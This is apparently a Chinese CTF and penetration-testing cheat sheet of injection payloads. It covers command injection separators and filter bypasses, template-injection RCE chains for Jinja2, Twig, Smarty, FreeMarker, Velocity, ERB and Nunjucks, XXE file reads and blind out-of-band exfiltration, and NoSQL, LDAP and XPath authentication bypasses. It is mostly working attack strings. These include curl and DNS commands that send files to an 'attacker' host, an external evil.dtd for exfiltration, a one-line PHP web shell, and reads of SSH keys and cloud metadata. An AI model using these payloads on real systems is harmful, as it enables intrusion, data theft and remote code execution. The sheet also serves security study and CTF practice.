# injection|命令与模板注入|⚙️
## [g1] 命令注入——用户输入被拼进系统命令，用分隔符注入并执行任意命令
### [cmdi-basic] 命令注入检测与分隔符全集 | easy | 命令注入;RCE | command injection;cmdi
> 识别命令拼接点，用分隔符全集注入
## 常见触发点
```txt
ping 8.8.8.8 {ip}      system('ping '.$ip)
exec('ls -la '.$dir)   os.system(f'ping {host}')
```
高风险函数：PHP system/exec/shell_exec/passthru（反引号同效）、Java Runtime.exec、Python os.system/subprocess、Node child_process。

## 分隔符全集
| Payload | 效果 |
|---|---|
| `; id` | 分号，最稳 |
| `| id` | 管道，前输出当输入 |
| `|| id` | 前命令失败才执行 |
| `&& id` | 前命令成功才执行 |
| `` `id` `` | 反引号命令替换 |
| `$(id)` | 命令替换，可嵌套 |
| `%0aid` | URL 编码换行 |

> [!tip] 判不清回显顺序就用 `;` 或 `|`；`||`、`&&` 依赖前命令退出码。
### [cmdi-close] 引号闭合与执行点确认 | easy | 命令注入;闭合绕过 | quote bypass
> 注入点带引号时闭合补全，先确认执行点再读取
## 闭合场景（源码带引号）
```bash
" ; id ; "        # 闭合引号并补全
" ; id #          # 注释掉尾部
' ; id #          # 单引号场景
```
无引号拼接：`127.0.0.1; id #` 或 `127.0.0.1 || id`。

## 确认执行点
```bash
; echo MARKER;    # 回显 MARKER 即成功
; sleep 5;        # 延迟判定
; id > /tmp/out;  # 写文件旁证
```
> [!warn] 先注入无害 echo 确认执行点，再上读取类 payload。
### [cmdi-blind] 无回显盲判与外带写文件 | medium | 命令注入;盲注;外带 | blind cmdi
> 无回显环境用延迟判定注入点，外带或写文件取数据
## 时间盲注判定
```bash
; sleep 5
| ping -c 5 127.0.0.1
$(sleep 5)
```
响应延迟即存在注入。

## 外带数据
```bash
; curl http://attacker:8080/$(whoami)
; curl http://attacker:8080/$(cat /flag | base64 -w0)
; ping -c 1 $(whoami).dnslog.cn    # DNS 外带
```
> [!tip] 外带前先 base64，flag 的花括号/空格会破坏 URL 与 DNS。

## 写文件 getshell
```bash
; echo '<?php system($_GET[c]);?>' > /var/www/html/s.php
```
> [!danger] 外带目标必须是自己可控的服务器或 dnslog，别打公网未知主机。
## [g2] 命令注入绕过——过滤空格与关键词时的高频绕过，WAF/黑名单通用
### [cmdi-bypass-space] 空格与命令名替换绕过 | easy | 命令注入;绕过;WAF | IFS bypass
> 空格被滤用 ${IFS}/Tab/重定向/花括号，命令被滤用等价命令
## 空格绕过
| Payload | 说明 |
|---|---|
| `cat${IFS}/flag` | ${IFS} 当空格 |
| `cat${IFS$9}/flag` | bash 下更稳 |
| `cat%09/flag` | Tab（URL 编码） |
| `cat</flag` | 输入重定向免空格 |
| `{cat,/flag}` | bash 花括号展开 |
| `x=ca;y=t;$x$y /flag` | 变量拼接 |

## 命令名替换（防关键词过滤）
```bash
tac /flag      head -1 /flag      strings /flag
less / more / nl / od /flag
```
> [!warn] 花括号展开依赖 bash；目标 sh/dash 时换 ${IFS} 或输入重定向。
### [cmdi-bypass-char] base64 解码与编码构造绕过 | medium | 命令注入;绕过;base64 | filter bypass
> 命令名/空格/斜杠全滤时用 base64 解码执行与转义字符构造
## base64 解码执行
```bash
echo Y2F0IC9mbGFn | base64 -d | bash   # cat /flag
echo 'Y2F0IC9mbGFn' | base64 -d | sh
```
命令名、空格、斜杠全被滤时首选。

## 编码/转义构造
```bash
cat /fla\g                 # 反斜杠转义
$'\x63\x61\x74' /flag    # ANSI-C 引号
$(printf '\143\141\164') /flag   # 八进制
```
> [!tip] $'\x..'、printf 八进制都是纯字符构造，黑名单正则难覆盖。
### [cmdi-readflag] 读 flag 路径与命令顺序 | easy | 命令注入;读取 | read flag
> 按稳定度优先尝试 flag 常见路径与环境变量
## flag 路径优先顺序
```bash
1. cat /flag
2. cat /flag.txt
3. find / -name '*flag*' 2>/dev/null
4. ls -la / /root /home /var/www
5. env | grep -i flag
```
> [!tip] Docker 靶机 flag 常见于 /flag、/flag.txt、/root/flag 或环境变量（CTFd 注入）。

## 无 cat 与组合兜底
```bash
tac /flag || head -1 /flag
strings /flag
; cat /flag 2>/dev/null || cat /flag.txt
; cat /proc/self/environ
```
## [g3] SSTI - Jinja2——Jinja2 模板注入：探测 → 逃逸链 → RCE 三步走
### [ssti-detect] SSTI 检测与引擎区分 | easy | SSTI;Jinja2 | template injection
> 用算术与字符串乘法探测模板注入点并区分引擎
## 检测
```txt
{{7*7}}      -> 49            存在注入
{{7*'7'}}    -> 7777777       Jinja2 特征（字符串乘法）
${7*7}       -> 49            JVM 引擎（FreeMarker/EL）
<%= 7*7 %>   -> 49            ERB
```
## 判定要点
```txt
输出 49 = SSTI；原样显示 = 纯反射
{{}} 被转义仍可能执行 {%...%} 语句块
```
> [!tip] 先 `{{7*'7'}}` 区分 Jinja2 与其他引擎，再选对应 payload，别硬套。
### [ssti-escape] class 逃逸链与 Popen 定位 | medium | SSTI;Jinja2;逃逸 | mro chain
> 从字符串对象沿 __class__.__mro__ 找到 subprocess.Popen 执行命令
## 标准逃逸链
```python
{{''.__class__}}                        # <class 'str'>
{{''.__class__.__mro__[1]}}             # <class 'object'>
{{''.__class__.__mro__[1].__subclasses__()}}
```
## 定位 Popen 下标
```python
{{''.__class__.__mro__[1].__subclasses__()[N]('id',shell=True,stdout=-1).communicate()}}
```
N 用枚举模板找（打印下标）：
```python
{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if 'Popen' in c.__name__ %}{{loop.index0}}{% endif %}{% endfor %}
```
> [!tip] 滤 `_`/`[` 时改用 attr 过滤器：`{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()}}`。
### [ssti-rce] 短链 RCE 模板与盲注判定 | medium | SSTI;Jinja2;RCE | popen rce
> 从内置对象取 os 模块执行命令，sleep 判定 RCE
## 短链 RCE（优先尝试）
```python
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{url_for.__globals__['os'].popen('cat /flag').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```
## 盲注判定
```python
{{lipsum.__globals__['os'].popen('sleep 5').read()}}   # 延迟 5s = RCE
```
> [!danger] globals 键名（os/builtins）随环境变：先 `{{lipsum.__globals__.keys()}}` 确认再取用。
## [g4] SSTI - 其他引擎——非 Jinja2 引擎：先识别引擎，再选对应 RCE payload
### [ssti-twig-smarty] Twig 与 Smarty 速查 | medium | SSTI;Twig;Smarty;PHP | twig injection
> PHP 两大模板引擎的检测与命令执行 payload
## Twig（PHP）
```php
{{7*7}}
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
{{['id','']|filter('system')}}
```
> [!tip] Twig 常用 `_self.env` 链；版本不同 payload 差异大，先看版本指纹。

## Smarty（PHP）
```php
{$smarty.version}              # 版本指纹
{if system('id')}{/if}         # Smarty3 可用
{php}system('id');{/php}       # 3.1 后默认禁用
```
> [!warn] 先探测版本再选 payload，Smarty 3.1 起 {php} 默认关闭。
### [ssti-java-other] FreeMarker/Velocity/ERB/Nunjucks | hard | SSTI;FreeMarker;Velocity;ERB | java ssti;erb;nunjucks
> 其余引擎检测与 RCE payload 对照
## FreeMarker（Java）
```java
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```
## Velocity（Java）
```java
#set($x="")$x.class.forName("java.lang.Runtime").getRuntime().exec("id")
```
## ERB（Ruby）
```erb
<%= system('id') %>   <%= `id` %>   <%= %x(id) %>
```
## Nunjucks（Node）
```js
{{'a'.constructor.constructor('return process.mainModule.require('child_process').execSync('id')')()}}
```
> [!danger] JSP EL 3.0 默认禁静态方法调用，多数直接 payload 不可用，先指认引擎与版本再打。
## [g5] XXE——XML 外部实体：本地读文件、盲外带、SSRF 三面
### [xxe-read] XXE 读文件与 php filter | easy | XXE;读文件 | xml entity
> DTD 实体读本地文件与 PHP 伪协议读源码
## 检测（读文件）
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```
回显 /etc/passwd 即存在。

## PHP 伪协议读源码
```xml
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/index.php">
```
base64 输出避免二进制/编码异常。

## 常用目标
| 目标 | 用途 |
|---|---|
| file:///etc/passwd | 用户枚举 |
| file:///etc/hostname | 主机指纹 |
| file:///proc/self/environ | 环境变量 |
| file:///root/.ssh/id_rsa | 私钥（有权限） |
> [!tip] JSON 接口改 Content-Type: application/xml 提交 XML body 即可切换测试面。
### [xxe-blind] 盲 XXE 外带完整模板 | medium | XXE;盲注;外带 | blind xxe;oob xxe
> 无回显时用外部 DTD 把文件内容外带到攻击者服务器
## 攻击者 VPS 放置 evil.dtd
```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/collect?d=%file;'>">
%eval;
%exfil;
```
## 靶机 payload
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://attacker/evil.dtd"> %remote;]>
<foo>1</foo>
```
%file 只能在外部 DTD 中引用，所以模板必须放在攻击者 VPS。
> [!danger] DTD 内部再定义实体时 % 必须转义为 &#x25;，否则解析报错；数据先 base64。
### [xxe-adv] XInclude 与解析器差异 | medium | XXE;XInclude;SSRF | xxe ssrf
> DTD 被禁时用 XInclude，解析器默认差异与 SSRF 变体
## XInclude（DTD 被禁时）
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
不依赖 DTD，适合实体过滤严格的解析器。

## 解析器差异
| 解析器 | 默认读实体 | 备注 |
|---|---|---|
| Python lxml | 是 | 高发 |
| Python defusedxml | 否 | 安全库 |
| PHP DOM/simplexml | 视配置 | 需 LIBXML_NOENT |
| Java DocumentBuilder | 否 | 需显式开启 |

## SSRF 变体
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">
```
> [!warn] 报洞前先确认解析器实际配置，默认是否吃实体直接决定可利用性。
## [g6] NoSQL 与 LDAP/XPATH——MongoDB 与 LDAP/XPath：结构注入与布尔盲注
### [nosql-auth] MongoDB $ne 认证绕过 | easy | NoSQL;MongoDB;认证绕过 | nosql injection
> 把登录字段改成查询对象，$ne/$gt 恒真绕过
## MongoDB 认证绕过
把登录字段改成查询对象：
```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":"admin","password":{"$regex":".*"}}
```
$ne != null 条件恒真，直接绕过登录。

## 参数类型混淆（表单/GET）
```txt
POST /login  username=admin&password[$ne]=x
GET  /api/user?id[$gt]=0
```
PHP/Express 把 [key] 解析成嵌套数组，后端当查询对象用。
> [!tip] JSON body 与表单参数两种形态都试；字段名可控即可挂 $ 运算符。
### [nosql-ldap-xpath] NoSQL 运算符与 LDAP/XPath | medium | NoSQL;LDAP;XPath | ldap injection;xpath injection
> MongoDB 运算符盲注与 LDAP/XPath 注入要点
## MongoDB 其他运算符
| 运算符 | 含义 |
|---|---|
| $gt/$lt | 范围比较 |
| $regex | 正则匹配 |
| $where | JS 表达式（布尔） |
| $exists | 字段存在性 |

## LDAP 注入
```txt
(uid=*)                 # 恒真绕过
admin)(|(uid=*))        # 闭合拼接
```
常见于 `(&(uid=USER)(password=PASS))` 拼接场景。

## XPath 注入与盲注
```txt
' or '1'='1                                    # 恒真
//user[name='admin' and substring(password,1,1)='f']   # 逐字符盲注
```
> [!danger] LDAP/XPath 盲注按字符探测慢：先猜长度，再二分逐位，用布尔差判定。
